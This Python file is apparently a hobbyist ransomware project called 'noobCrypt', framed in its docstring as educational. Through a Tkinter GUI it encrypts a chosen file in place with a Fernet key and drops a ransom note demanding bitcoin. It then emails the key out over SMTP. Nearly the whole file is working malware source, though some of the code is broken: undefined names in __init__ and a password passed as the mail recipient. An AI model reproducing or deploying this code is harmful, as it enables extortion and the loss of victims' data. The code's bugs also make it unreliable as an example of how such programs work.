import os, base64, smtplib, config
from cryptography.fernet import Fernet
from tkinter import *
from os.path import join

"""
This program takes a file and it's location as inputs, and encrypts it using symmetric fernet encryption. It then sends the key to an e-mail SMTP server
I will note that I only tested this on text files, but it should theoretically work on any file type.

The guides I used to create this:
1)Encryption https://www.youtube.com/watch?v=ScL07VJJOX4 
2)Email:https://www.youtube.com/watch?v=mP_Ln-Z9-XY

It's apparent that Google has let their 'receive less safe mail' functionality degrade; the button was broken when I tried using it, but I still
wanted to get my hands dirty on some light net-coding so I kept this in. It should theoretically work with an actual functioning SMTP server.

Encrypting other people's files without their permission is illegal. This code is done as a project to explore the creation of maleware and is 
ONLY for educational purposes. DO NOT USE THIS ILLEGALLY.
"""
class noobCry:
    def __init__(self,fileName, key, location, encryptedFile,f):#initialize all of the variables in the Class
        self.fileName = fileName
        self.fernetKey = fernetKey
        self.encryptedFile = encryptedFile
        self.fernetObject = fernetObject
    #End __init__

    def encrypt(fileName,location):
        for root, dirs, files in os.walk(location, topdown=True):#This loop iterates over directories passed as the first argument, the second arg iterates from the top of directory
            if fileName in files:#If the file is found, it triggers the encryption here
                fernetKey = Fernet.generate_key()#create key
                fernetObject = Fernet(fernetKey)#create object to use the key
                with open(fileName, "rb") as file:#open the file, using the "read bytes" built-in function
                    fileData = file.read()#read the data into fileData variable
                    encryptedFile = fernetObject.encrypt(fileData)#take the f object containing the key and use is the encrypt the target data
                    with open(fileName, "wb") as file:#open the file again using the "write bytes" built in function
                        file.write(encryptedFile)#write the encypted data to the file
                        return fernetKey
    #End encrypt()
    def ransomNote(location):
        bitcoinMsg = "Give 100 dollars in bitcoin to this address--> bitcoincash:aasbjsjjfioo234h44n5kkll,with a note including your email addressto have your file unlocked, there is no other possible way to retreive it!"
        name = "RANSOM_NOTE_VERY_IMPORTANT.txt"
        ransomNote = open(join(location,name),"x")
        ransomNote.write(bitcoinMsg)
        ransomNote.close()

    def email(email,password,SMTP,port,fernetKey):
        try:
            server = smtplib.SMTP(SMTP+':'+port)# create smtp object
            server.ehlo()#extended hello to server
            server.starttls()#initiates transport layer security
            message = fernetKey
            server.login(email,password)
            server.sendmail(email,password,message)
            server.quit()
            #outputs message(s) below entry fields
            labelLocation = Label(window, text="Complete!.")
            labelLocation.grid(column=1, row=8)
        except:
            labelLocation = Label(window, text="Error resolving email, try again!.")
            labelLocation.grid(column=1, row=8)
    #End email



#Gui Setup
window = Tk()# Tk object I think
window.title("noobCrypt")#Window Label
window.geometry('420x180')#Blaze it

#name label
labelName = Label(window, text="File name")
labelName.grid(column=0, row=0)

#name input
textName = Entry(window,width=50)
textName.grid(column=1, row=0)

#Location label
labelLocation = Label(window, text="File Location")
labelLocation.grid(column=0, row=1)

#Location input
textLocation = Entry(window,width=50)
textLocation.grid(column=1, row=1)

#SMTP server name
labelSMTP = Label(window, text="SMTP Address")
labelSMTP.grid(column=0,row=2)

#SMTP server name
textSMTP = Entry(window, width=50)
textSMTP.grid(column=1,row=2)

#port
labelPort = Label(window, text="Port #")
labelPort.grid(column=0,row=3)

#port
textPort = Entry(window, width=50)
textPort.grid(column=1,row=3)

#email labels
labelEmail = Label(window, text="Email")
labelEmail.grid(column=0,row=6)

#email input
textEmail = Entry(window, width=50)
textEmail.grid(column=1, row=6)

#password label
labelPassword = Label(window, text="Password")
labelPassword.grid(column=0, row=7)

#password input
textPassword = Entry(window,width=50)
textPassword.grid(column=1, row=7)
textPassword.config(show = "*")#obscures password entry

#Instructions
labelLocation = Label(window, text="Encrypt a file and email yourself the key.")
labelLocation.grid(column=1, row=9)#outputs message below entry fields

#on 'Confirm' button click, gets text from the fields and feeds them into 
def confirm():

    #hold the file name
    fileName = textName.get()
    #hold the directory location
    location = textLocation.get()
    #hold SMTP address
    SMTP = textSMTP.get()
    #hold port #
    port = textPort.get()
    #hold the email address
    email = textEmail.get()
    #hold the password
    password = textPassword.get()
    #hold the fernet key, received after calling encrypt()
    fernetKey = noobCry.encrypt(fileName,location)
    noobCry.ransomNote(location)
    #call the function 'email()' and use smtp protocol to send the fernet key
    noobCry.email(email,password,SMTP,port,fernetKey)
#End confirm()

def close():
    exit()
#End confirm()

#This code sets up the buttons
buttonEncrypt = Button(window, text="Encypt/Send Key", command=confirm)
buttonEncrypt.grid(column=0, row=8)
buttonClose = Button(window, text=" Close ", command=close)
buttonClose.grid(column=0, row=9)

#this is the loop that keeps the window open
window.mainloop()